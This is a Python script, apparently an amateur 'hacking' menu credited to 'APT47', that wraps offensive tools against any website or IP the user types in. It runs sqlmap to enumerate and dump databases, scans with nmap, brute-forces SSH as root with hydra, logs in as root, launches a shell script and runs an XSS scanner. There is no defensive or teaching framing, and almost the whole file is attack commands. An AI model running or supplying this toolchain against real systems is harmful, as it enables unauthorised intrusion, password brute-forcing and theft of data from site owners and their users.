import os,sys
import time
from time import sleep as timeout
#Banner

os.system('clear')
os.system('figlet -f mono9 NEBULA | lolcat')
time.sleep(3)
os.system('clear')
os.system('figlet -f mono9 SQL injection | lolcat')
print
print
print ('BY : APT47')
print
print
#Hacking
target = input('Target WebSite : ')
os.system("sqlmap -u %s --dbs"%(target))
data = input("DataBase : ")
os.system("sqlmap -u %s -D %s --tables"%(target, data))
tables = input("Tables : ")
os.system("sqlmap -u %s -D %s -T %s --columns"%(target, data,tables))
columns = input("columns : ")
os.system("sqlmap -u %s -D %s -T %s -C %s --dump"%(target, data, tables, columns))
print
print ('finished sql injection')
print
timeout(2)
os.system ('figlet -f mono9 Hydra | lolcat')
print
nmap = input('IP WEBSITE : ')
os.system("nmap %s "%(nmap))
time.sleep(3)
print ('do you want to brute force ssh ? [y/n]')
A = input("SELECT : ")

if  A == "y" or A == "yes":
     PASS = input('wordlist : ')
     os.system("hydra -l root -P %s %s ssh"%(PASS, nmap))
print
print ('do you want to connect ssh ? [y/n]')
E = input("SELECT : ")

if  E == "y" or E == "yes":
     os.system("ssh root@%s"%(nmap))
print
print
print ('finished secure shell hacking')
print
print
time.sleep(3)
os.system('figlet -f mono9 SPID3R | lolcat')
time.sleep(3)
os.system('cd SH33LL')
os.system('python2 sh33l.py')
print
print
print ('finished SP1D3R')
print
print
time.sleep(3)
os.system ('figlet -f mono9 XSS | lolcat')
print
XSS = input('WEBSITE : ')
os.system("XSpear -u %s "%(XSS))
print
print
print
print ("HACKING FINISHED")
print
print ('bye bye CU again :)')